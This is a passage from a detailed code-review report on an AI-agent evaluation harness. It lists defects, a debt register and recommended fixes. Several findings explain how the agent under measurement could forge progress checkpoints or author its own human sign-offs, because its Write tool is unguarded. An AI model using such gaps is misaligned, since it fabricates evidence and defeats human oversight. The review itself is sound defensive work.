that digests the wrong file — plus the whole of C-1's sign-off chain, stay open until after
the main experiment run.

### Reader `server` — further findings

**server-13** · `queries.py:71-75` · correctness
`_processed_cluster_ids` counts **any directory** under `checkpoints/` as a processed
cluster — `{entry.name for entry in checkpoints.iterdir() if entry.is_dir()}`, with no
check that it holds a manifest. Filed as "Important if anything else writes there; Minor
otherwise", and the reviewer then escalated it itself on learning the arm definitions: an
agent with `Write` can create those directories.
SEVERITY: Important — confirmed. The mechanism is real: `queries.py:69-75` validates
nothing, and `arms.py:21,46,53,60` give `Write` to every arm while `enforcement.py:208`
guards only `Bash`. **Not exercised in the pilot**: all **2,052** checkpoint directories
across the six pilot run workspaces contain a `manifest.yaml`; zero are bare. So the
progress metric is forgeable, and the pilot's own progress figures were not forged.

**server-14** · `queries.py:130-132` · correctness
`patch_offset`/`patch_limit` are unvalidated; a negative offset silently returns a tail
slice.
SEVERITY: Minor — confirmed by inspection; `patch_total_bytes` makes it detectable.

**server-15** · `queries.py:40`, `history/index.py:123` · security
Agent-supplied SQL runs on a read-write sqlite handle, guarded only by a leading-`select`
regex.
SEVERITY: Minor — confirmed by inspection; no data-modifying CTEs are reachable, `execute`
refuses multi-statements, and extensions are off by default.

**server-16** · `gates.py:23`, `draft.py:21` · resource
No `timeout` on any `subprocess.run`, so a wedged stage hangs the tool call indefinitely.
SEVERITY: Important if any invoked stage can block; Minor otherwise — **unsettled**; needs
a trace into the substrate stages. Sibling of S-3 (`urlopen` without a timeout) on the
process side rather than the network side.

**server-17** · `cli.py:285` · doc-drift
The `checkpoint` verb collapses non-zero exit codes to 1 despite two docstrings promising
raw pass-through.
SEVERITY: Minor — confirmed against the four branches; only `checkpoint` remaps.

**server-18** · `draft.py:138` · api-contract
`findings` is `list[dict]` or `list[str]` depending on which source is non-empty.
SEVERITY: Minor — confirmed by inspection.

**server-19** · `queries.py:66,140` · correctness
`status()` guards on `timeline.json` but reads `clusters.jsonl` unguarded, raising
`FileNotFoundError`.
SEVERITY: Minor — confirmed by inspection.

**server-20** · `tests/test_parity.py:85-91` · test-gap
The parity-table test checks only that tool names appear, not verb coverage or
verb-to-tool pairing. Independently reached by the `tests` reviewer as tests-01, from the
other side.
SEVERITY: Minor — confirmed by reading the assertion, a substring test over the whole file.

**server-21 onward** — delivered after this section was first written; see *the tail* at
the end of this report. The slice is complete.

### A note on how server-13 was settled

This is the clearest example in the review of the settling step doing real work in both
directions at once. The reviewer filed the finding conditionally. Learning the arm
definitions — from a slice it could not read — it correctly escalated its own conditional
to Important, because the agent does have `Write`. But the second half of the condition,
whether any run actually exercised it, is a question about recorded data rather than about
code, and the answer is no: 2,052 of 2,052 checkpoint directories hold a manifest.

So the defect is real and should be fixed, and no pilot figure needs revisiting. Reporting
only the first half would have implied the pilot's saturated progress metric was suspect;
reporting only the second would have buried a live forgery path. Both halves belong in one
severity line.

## Debt backlog

Registered gaps are treated here as debt rather than as accepted design, per the decision
framing this review. The register itself is therefore under audit: each entry is checked
against the code, and register *drift* — an entry that no longer describes reality — counts
as a defect in its own right.

The register is real and unusually good. It spans four READMEs (`ai_rfc/`, `pipeline/`,
`history/`, `coverage/`), two reference documents, and named sections in the plan files.
Several entries record measured costs and even a dead end, which is rarer and more useful
than a list of intentions.

### Registered, still accurate, and worth keeping as written

| # | Item | Registered at | Cost to close | Recommendation |
|---|---|---|---|---|
| D-1 | `--numstat` line counts not implemented; 60 s/run is why | `history/README.md:182-189` | One opt-in flag | **Keep.** A measured refusal with the number attached. The register calls it "a defect that passes its own tests", which is the right framing. |
| D-2 | `--no-renames` measured, changed nothing | `history/README.md:191-194` | Zero | **Keep.** A recorded dead end saves the next person an hour. |
| D-3 | `coverage` proposes, never merges | `coverage/README.md:13-19` | n/a | **Keep.** Merging is a decision; leaving it looking like one is correct. |
| D-4 | Criterion is `line-executed` only | `coverage/README.md:30-36` | n/a | **Keep.** The limit travels with each proposal rather than living in someone's head. |
| D-5 | Only the JaCoCo reader exists | `coverage/cli.py:21-23` | One reader per format | **Keep** until a second format is actually needed. |
| D-6 | `pipeline` stops at the two content stages and exits 0 | `pipeline/README.md:10-21` | n/a | **Keep.** Reaching the boundary is success. |
| D-7 | Pipeline state is derived, never recorded | `pipeline/README.md:44-53` | n/a | **Keep.** The reasoning — a ledger "would start lying" once a sub-CLI is run by hand — is sound. |
| D-8 | The seventh digest helper is excluded from the duplication table on purpose | `README.md:490-492` | n/a | **Keep, and do not mistake for an omission.** |

### Registered, but the review shows the entry understates the problem

| # | Item | Registered at | Finding | Recommendation |
|---|---|---|---|---|
| D-9 | `--allowedTools` does not confine a built-in tool | `enforcement.py:1-9` | This is the enabling condition for **C-1**, the evidence-fabrication chain. The register treats it as a CLI limitation to work around with a Bash guard; it is also the reason `Write` is unguarded in every arm. | **Raise.** The entry should say which tools are therefore unconfined, and `arms.py:21` should stop calling a tuple containing `Edit` and `Write` `READ_TOOLS`. |
| D-10 | The duplication table is hand-maintained and has drifted twice | `README.md:468-521`, gate at `test_cli_conventions.py:67` | Confirmed partial gate: 6 rows, 4 covered. `tests-05` adds that the two uncovered rows name *concepts*, not `def` names, so the existing gate cannot be extended to them without rewriting the rows. | **Fix the rows, then the gate.** This is the `feedback_partial_validation_gate` shape: the uncovered row is the one that drifts. |
| D-11 | "No gap in this list remains open" | `README.md:294` | **Now false.** This review found six Criticals and roughly twenty-three Importants, none of them in the register. | **Correct the sentence.** A register that asserts its own completeness is worse than one that does not, because a reader stops looking. |

### Unregistered debt found by this review

Nothing below appears in any register. Under the decision framing this review, these are
the entries that should be added.

| # | Item | Evidence | Cost |
|---|---|---|---|
| U-1 | `types-PyYAML` is neither declared nor installed, so mypy checks no YAML path in a YAML-centric package | 8 of 10 PANTHER-side mypy errors | One dev dependency, then fix what it exposes |
| U-2 | Five `# noqa` suppressions with no register entry | `workspace.py:126`, `conftest.py:13`, `claims.py:41`, `questions.py:13`, `guard.py:15` | Small; `questions.py:13` is the only one with no stated reason |
| U-3 | `history/aggregates.py` is dead — 56 lines, no production caller | `evidence-12` | Delete |
| U-4 | `summary.py` has no production caller at `5fa8891` — 384 lines | `runner-21` | It is new; wire it up or hold it |
| U-5 | Three separate token accountings, none named canonical | `runner-12`, `runner-20` | Pick one, document the other two as derived |
| U-6 | Four readers of `clusters.jsonl`, three unguarded | `core-08` | One shared reader |
| U-7 | ~70 untriaged substring assertions in the harness test tree | `tests` reviewer's own account | A follow-up pass, not a fix |

### Register drift — in both directions

**Closed, and closed well.** An earlier plan recorded `guard.py` failing open: its handler
caught only `JSONDecodeError`/`ValueError`, so a non-dict payload raised `AttributeError`,
exited 1, and 1 permits the call. That is **genuinely fixed**. `guard.py` now catches bare
`Exception` on the payload read and returns 2, carries two `isinstance` checks each
returning 2, and wraps `main()` in a `try/except Exception` that exits 2 — with a comment
explaining that naming exception types "leaves the guarantee false for every type nobody
named". This is the register working as intended.

**A consequence for U-2 worth stating plainly: two of the seven `# noqa` suppressions are
not debt at all.** `guard.py:59` and `server/cli.py:303` suppress `BLE001`, the rule that
would push both files back toward the narrow-`except` bug the register recorded. They are
load-bearing correctness guarantees wearing a lint suppression. Counting all seven against
the project would have been wrong, and it is the kind of error a marker-count audit makes
by default.

**Drifted the other way.** Commit `a20cc9a7b` ("pipeline run performs six of the eight
commands, not four", today) changed documentation only — five doc files plus `__init__.py`
and `entrypoints.py`, no behaviour. It aligned the prose to the stage-skipping defect
rather than fixing it, and left `State.RECOMPUTED`'s contradictory docstring standing. See
**C-2**.

### Deferred, and still blocked

These four are registered in `2026-09-02-arfc-panther-subcommand.md:787-810` as blocked on
the main experiment run finishing, because each changes strings the rendered agent skills
record. Ranked and costed rather than dropped:

| # | Item | Cost | Blocker |
|---|---|---|---|
| B-1 | Make the module root a dispatcher (`python -m …ai_rfc <verb>`) | Moderate; the validator moves to `validate/` | Main run |
| B-2 | Re-render the agent skills onto `panther ai-rfc` | Small, but breaks pilot comparability | Main run |
| B-3 | Extract `ai_rfc` as its own project | ~135 lines across ~70 files in two repositories, plus the `parents[5]`/`parents[10]` conftest arithmetic | Main run |
| B-4 | Rename `adjudicate` → `check` inside the harness | Two surfaces: `ai_rfc_claim_adjudicate`, `claim-adjudicate` | Main run |

B-3 remains the strongest structural finding on the table, and this review adds a reason
the plan did not have: the harness moved six commits and 1,120 lines *during a review of
it*, while the parent's pointer stayed still. Two repositories that move at different rates
under one branch is a coordination cost that will keep being paid.

**One item is now more urgent than its blocker suggests.** `harness/docs/experiment-protocol.md`
carries 12 unchecked preregistration boxes. `runner-14` notes that `audit` and `analyze`
exit 0 whatever they find, which is only tolerable while a human reads every report — and
the protocol's unchecked reporting commitments are exactly the thing that would decide
whether the pipeline is ever script-driven.

## Strengths

Named accurately rather than generously, because the assessment below depends on the
difference. These are the things a reviewer would have to work to find fault with.

**The evidence layer is the best-reasoned part of the codebase, and it is honestly
tested.** `test_promotion.py:90-109` asserts that interview+paper and interview+ADR *stay*
at `inferred` — the two-narrative-source route a lazy suite would omit, and precisely the
circularity `PRIMARY_EVIDENCE` exists to block. `claims.py:22-36,95-99` excludes `status`
from the writable fields *and* rejects it separately with an explanatory message, so an
agent cannot assert a standing its evidence does not support.

**Numbers are reported with the denominator that makes them readable.**
`models.py:154-169` reports `confirmed_count_by_req_class` beside the fraction, with a
docstring naming the reason: `0.0` has two readings and only the denominator says which.
`metrics._arm_summary` reports `runs_with_unknown_cost` and `runs_with_broken_surface`
beside the figures they were excluded from rather than folding unknown into zero.
`report.py:28-35` with `cli.py:99-104` makes "no findings" distinguishable from "nothing
checked". This is instrument design, not bookkeeping, and it is consistent across
modules by different-looking hands.

**Determinism is defended where it would actually leak.** `views/emit.py:21-40` neutralises
every gitconfig drift source a reviewer could name, with the reasoning recorded.
`coverage/commit.py:55-61` uses `rev-parse --verify <rev>^{commit}` and carries a comment
naming the plain-`rev-parse` trap it replaced — which exits 0 for any 40-hex string.
`history/git_log.py:105-118` keeps a field-count guard deliberately after `maxsplit` made
it redundant.

**Writes are made safe before they are made.** `claims.py:60-66` round-trips every manifest
write through the strict schema in a scratch directory *before* `os.replace`, then re-reads
from disk and returns what actually stored rather than echoing the input.
`draft.py:114-140` is tag-then-verify-then-delete, with the ordering rationale written down
and `rolled_back` reported rather than hidden.

**One reader, not two.** `audit.in_arm` decides Bash by calling `enforcement.is_allowed` —
the same function the live guard runs — instead of re-deriving from a surface label. The
`runner` reviewer checked the remaining derived pair and confirmed they still agree. This
is the single place where a second reader would have drifted, and it was avoided
deliberately.

**The tests guard their own degenerate readings.** `test_metrics.py:164-189` asserts both
that an unpriced run is excluded *and* that a priced failure still scores 0.375, so the
metric cannot pass by being always-zero. `test_enforcement.py:54-68` is an adversarial
allowlist suite — command substitution, backticks, `| sh`, the empty string — not a
happy-path one. `test_cli_conventions.py:125-127` guards its own vacuous pass before
comparing sets. `draft/conftest.py:41-55` builds its fixture *through the shipped code*, so
fixture and production cannot drift apart. And across all 10,387 lines of test there are
**zero** occurrences of `mock`, `MagicMock`, `patch` or `assert_called`.

**A version pin that carries its incident.** `server/pyproject.toml:13-19` pins `mcp<2` and
records the failure it prevents — tools silently absent while the session still reports
success, and the run that spent $5.90 mining claims in an invented vocabulary because
nothing was there to validate them. This is how a version bound should be written.

**A register entry that closed properly.** The `guard.py` fail-open defect recorded in an
earlier plan is genuinely fixed, and fixed in the harder, more correct direction: a bare
`except Exception` returning the blocking exit code, two `isinstance` guards, and a
top-level catch — with a comment explaining why naming exception types leaves the guarantee
false for every type nobody named.

## Assessment

**Is the code any good? Yes, and unusually so in its reasoning — but it has a blind spot
with a name.** The craft is real: the evidence rules, the determinism defences, the
denominators beside the fractions, the write-then-verify discipline. What the codebase
consistently gets right is *statistical* honesty — undecided is never scored as failed,
unpriced is never zero, a cap is never silently rounded to a complete answer.

What it does not have is a notion of **provenance** honesty: no part of it asks "who
produced this, under what code, and were they entitled to?" Every one of the six Criticals
is that same absence wearing a different hat. The agent under measurement can author its
own sign-offs (C-1) because nothing binds evidence to a human. Re-analysis rewrites the
record with confidently wrong numbers (C-5) because nothing binds a computation to the
revision that produced it. A question overwrite destroys a human answer (C-6) because
nothing checks whether an id was already claimed. The manifest goes unvalidated on the
default path (C-2) because nothing insists the check was performed. That is one design gap
with six symptoms, not six unrelated bugs — which is good news, because it makes the fix a
coherent piece of work rather than a list of patches.

**Is technical debt hiding in it? Almost none is hiding; a lot is written down; and the
register itself has one dangerous sentence.** There are zero `TODO`, `FIXME`, `HACK`,
`XXX`, `NotImplementedError`, skipped or expected-fail tests, and zero `# type: ignore`
across 18,443 lines and two repositories. Seven `# noqa` suppressions exist, all in the
harness — and two of those are correctness guarantees rather than debt, suppressing the
very rule that would reintroduce a bug the project already fixed. PANTHER-side formatting
and linting are completely clean.

The debt is instead recorded in prose, in unusual quantity and quality — measured costs, a
recorded dead end, deliberate exclusions marked as deliberate. Treating those entries as
debt rather than as settled design, which is what you asked for, produces the backlog
above: eight entries worth keeping as written, three where the register understates the
problem, and seven genuinely unregistered items. The one entry to change first is
`README.md:294`, "No gap in this list remains open." That is now false, and a register
asserting its own completeness is worse than no register, because a reader stops looking.

**Are the commands and features finished? The commands are; the surfaces are not evenly
tested; and two features are present without a caller.** All 13 PANTHER-side verbs exist,
carry help text and tests, and no flag is defined but never read. But 8 of 16 MCP tools
have no test at the tool boundary, and four verbs — `cluster-get`, `question-draft`,
`question-export`, `answer-record` — have none at either surface a user or agent can reach.
`answer-record` is the one that matters: it is the human sign-off path, and it is both
untested at both entry points and the centre of C-1. Three `experiment` verbs are never
reached through `cli.main`, and only one of the three declares it. Two modules have no
production caller at all: `history/aggregates.py` (56 lines) and the brand-new
`summary.py` (384 lines).

**What to fix first, in order.** C-1, because an instrument whose subject can author its
own grades cannot support a published claim, and because the cheapest link — rejecting an
empty quote — is a one-line change. C-5 next, as a refusal rather than a shim: make
`load_campaign` compare the frozen campaign's revision against the live checkout and raise,
and make `audit_run`/`analyze_run` decline to overwrite a record produced under a different
revision. Then C-2, which is the one number the instrument exists to produce going
unverified on the path most runs take. Then `evidence-01`, the highest-value item this
review could not settle — the mechanism is confirmed against a purpose-built repository and
only the question of whether real targets exercise it remains.

**One thing to do before any of that.** Decide how two repositories moving at different
rates under one branch is going to be coordinated. This review watched the harness advance
six commits and 1,120 lines while it was being read, which is why one 88-line change went
unreviewed and two citations went stale. That is not a code defect, but it set the ceiling
on what this review could guarantee.

## How this report was checked

**Every severity line carries its evidence.** 88 severity lines were extracted and each
joined with its continuation, then tested for a settling check or a confirming artifact.
Four did not match the pattern and were read individually: all four carry their evidence in
a phrasing the check did not anticipate — "settled from the other side by the `server`
reviewer", "the pilot's recorded and mounted digests match on every run", "no per-cluster
campaign has produced artifacts", and a citation of the module docstring that scopes
`summary.py` out of `metrics`. They are legal. The check was left as it is rather than
widened until it went green, because a gate tuned to pass is not a gate.

The plan's own version of this check was a single-line `grep`. It flagged 44 legal lines,
because a severity line whose settling clause wraps to the next line is still one logical
line. That is recorded here rather than quietly fixed: the gate a plan specifies is itself
a claim, and this one was wrong.

**No placeholder survived.** A grep for `<verbatim>` and `TBD` returns nothing.

**All seven seed findings are accounted for.** S-1 and S-2 confirmed and widened by the
`server` reviewer; S-3, S-4 and S-6 confirmed by `evidence`, with evidence-08 identified as
the substantive part of S-6; S-5 confirmed by `core` as core-05; S-7 confirmed and widened
by `runner` as runner-11, which adds that `enforcement.py` is equally undigested.

**What was measured rather than read.** The confirmations in this report rest on: three
full test-suite runs; `mypy`, `black` and `flake8` at the correct settings; a probe
workspace exercising `pipeline run` both ways; an injected forge transport; a purpose-built
git repository with a content-introducing merge; two in-memory pytest plugins that
monkeypatch a target and observe what a suite still passes; direct recomputation of the
pilot metrics from the frozen transcripts; and a walk of all 2,052 pilot checkpoint
directories. Findings that could not be settled that way say so in their own severity line.

### Reader `server` — the tail, delivered after the first assembly of this report

The slice is now **complete; nothing outstanding.** An earlier draft of this report
recorded these three as never delivered; they arrived and are recorded here, and the
coverage-limits section is corrected accordingly.

**server-21** · `draft.py:66` · correctness
`stdout.split()` on `--name-only` output splits a path containing a space into two files.
SEVERITY: Minor — confirmed by inspection.

**server-22** · six merged one-line findings · correctness / api-contract
`claims.py:49-57` leaves the manifest at `mkstemp`'s 0600 and never `fsync`s;
`revisions.py:23` accepts an empty `note` while `commit_draft:56` and `tag_revision:102`
both require a non-empty message; `testing.py:86-103` uses bare `assert` for control flow,
which `python -O` voids; `claims.py:143` flags understatement but never the
stored-exceeds-supported direction; `queries.py:87` documents "lowest-ordinal" but returns
file order; `queries.py:165` conflates "no tags yet" with "no draft repo".
SEVERITY: Minor — confirmed by inspection; none reaches the evidence surface.

**server-23** · `pyproject.toml:19` · correctness
The `mcp>=1.0` lower bound may admit versions lacking the `mcp.server.fastmcp` import that
`server.py:5` performs. Note the upper bound (`mcp<2`) is well-justified and carries its
incident; this is about the floor.
SEVERITY: Important if `mcp.server.fastmcp` is absent from 1.0.0; a non-finding otherwise —
**unsettled**: PyPI is blocked by the sandbox proxy. Settled by
`pip download mcp==1.0.0 --no-deps` and listing the wheel for `server/fastmcp`.

### Two closing observations from this reader, both worth keeping

**On why the forgeable progress metric is safe to leave.** The 2,052-directory sweep is
what makes it safe: a forgeable metric that was demonstrably not forged means the pilot's
numbers stand and nothing has to be re-run, so the finding stays live as a hardening item
rather than becoming a retraction. **A future campaign without that sweep would have no
such guarantee** — so if `queries.py:71-75` is not fixed, the sweep should become part of
the post-run audit rather than something a reviewer happened to do once.

**On the narrow end of the C-1 chain.** Since `Write` is granted in all three arms and the
guard matches only `Bash`, that grant also reaches `record_answer`'s transcript argument —
which is the shared mechanism behind both the empty-`quote` finding and the
self-certifying-transcript one. If only one thing changes harness-side, the cheapest
sufficient fix is at the narrow end: **resolve the transcript path and check workspace
containment at `questions.py:157`, and require a non-empty `quote` at `:163`.** That closes
the chain without touching the arm definitions the experiment's independent variable depends
on — which is the change this cycle cannot afford to make.
